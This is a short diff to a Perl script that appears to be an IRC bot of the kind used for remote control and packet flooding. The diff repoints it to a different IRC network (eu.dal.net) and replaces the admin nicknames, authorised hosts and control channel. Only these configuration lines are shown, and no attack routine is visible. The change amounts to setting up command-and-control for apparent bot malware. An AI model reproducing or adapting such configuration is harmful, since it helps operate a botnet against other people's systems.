@@ -57,7 +57,7 @@ chop (my $realname = $rircname[rand scalar @rircname]);
  
 my $nick =$rircname[rand scalar @rircname];
  
-$server = 'eu.undernet.org' unless $server;
+$server = 'eu.dal.net' unless $server;
 my $port = '6667';
  
 my $linas_max='8';
@@ -66,9 +66,9 @@ my $sleep='5';
 my $homedir = "/tmp";
 my $version = 'irc bot lilmoe.*®';
  
-my @admins = ("lilmoe","moe");
-my @hostauth = ("lilmoe.users.undernet.org");
-my @channels = ("#gptmoe");
+my @admins = ("lilmoe","MOFO");
+my @hostauth = ("lilmoe.store","e617-1731-3182-9126-8def.131.217.ip");
+my @channels = ("#dew");
  
 my $pacotes = 1;
  
